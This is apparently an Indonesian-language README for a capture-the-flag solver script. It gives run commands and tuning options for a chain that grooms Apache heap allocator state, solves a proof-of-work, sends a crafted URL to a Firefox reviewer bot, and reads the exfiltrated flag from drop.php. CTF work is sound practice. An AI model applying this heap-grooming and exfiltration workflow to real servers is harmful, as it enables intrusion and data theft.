# XDD Remote Solver

## Setup

```bash
cd XDD
source /home/nata/ctf_env/bin/activate
pip install -r requirements.txt
```

Solver menerima dua endpoint eksternal:

- `--site`: aplikasi Folio/PHP.
- `--review`: service reviewer/PoW.

URL yang dibuka Firefox dari dalam instance default-nya `http://127.0.0.1:8080`, jadi `--browser-base` biasanya tidak perlu diubah.

## Run pertama

Mulai dari layout yang sudah paling kuat dan jumlah grooming yang paling stabil:

```bash
python3 -u solve.py \
  --site 'http://HOST:SITE_PORT' \
  --review 'http://HOST:REVIEW_PORT' \
  --profile auto \
  --groom-rounds 92 \
  --groom-header-modes minimal \
  --layout-presets classic \
  --poll-timeout 22 \
  | tee remote-fast.log
```

Kalau instancer memberi satu hostname dan dua port:

```bash
python3 -u solve.py \
  --host HOST \
  --site-port SITE_PORT \
  --review-port REVIEW_PORT \
  --profile auto \
  --groom-rounds 92 \
  | tee remote-fast.log
```

Output sukses:

```text
<FLAG>NHNC{...}</FLAG>
```

## Sweep utama

Reset/restart instance sebelum menjalankan sweep agar state worker bersih.

```bash
python3 -u solve.py \
  --site 'http://HOST:SITE_PORT' \
  --review 'http://HOST:REVIEW_PORT' \
  --profile broad \
  --groom-rounds-list 88,92,96 \
  --groom-header-modes minimal \
  --layout-presets classic \
  --poll-timeout 22 \
  | tee remote-broad.log
```

## Fallback allocator

Kalau sweep utama belum hit, reset instance lagi lalu coba header grooming Firefox dan duplicate-key 56-byte. Duplicate key memengaruhi free-list request-variable sebelum parameter besar diproses.

```bash
python3 -u solve.py \
  --site 'http://HOST:SITE_PORT' \
  --review 'http://HOST:REVIEW_PORT' \
  --profile broad \
  --groom-rounds-list 88,92,96 \
  --groom-header-modes firefox \
  --layout-presets dup56 \
  --poll-timeout 22 \
  | tee remote-firefox.log
```

Kalau HTTP pipelining dibatasi proxy:

```bash
python3 -u solve.py \
  --site 'http://HOST:SITE_PORT' \
  --review 'http://HOST:REVIEW_PORT' \
  --profile broad \
  --groom-mode requests \
  --groom-rounds-list 88,92,96 \
  --groom-header-modes firefox \
  --layout-presets dup56 \
  --poll-timeout 22
```

## Matrix paling lebar

Gunakan hanya kalau tiga tahap di atas gagal dan instance masih punya waktu cukup:

```bash
python3 -u solve.py \
  --site 'http://HOST:SITE_PORT' \
  --review 'http://HOST:REVIEW_PORT' \
  --profile all \
  --groom-rounds-list 80,88,92,96 \
  --groom-header-modes minimal,firefox \
  --layout-presets classic,dup56 \
  --attempts 1 \
  --poll-timeout 22 \
  | tee remote-wide.log
```

## Profil payload

- `auto`: `multi-nul` dan `multi-896`.
- `broad`: semua jendela nonce dari `A+512` sampai `A+1152`.
- `all`: menambah fallback `exact-nul` dan `nonce1-loader`.

## Opsi penting

```text
--groom-connections 5       jumlah worker Apache yang digroom paralel
--groom-rounds 92           request per koneksi
--groom-rounds-list LIST    sweep beberapa jumlah request
--groom-mode MODE           pipeline atau requests
--groom-header-modes LIST   minimal dan/atau firefox
--layout-presets LIST       classic, dup56, distinct56
--shape-count 7             parameter besar pembentuk heap
--shape-length 360          panjang parameter besar
--final-carry-length 255    panjang reserve/carry request final
--pow-workers 8             proses pemecah PoW
--poll-timeout 22           waktu menunggu exfiltration
--browser-base URL          alamat site dari sudut pandang reviewer
```

Solver melakukan seluruh chain: membuat note biner, menyiapkan state allocator Apache, menyelesaikan PoW, mengirim URL ke Firefox reviewer, lalu membaca flag dari `drop.php`.
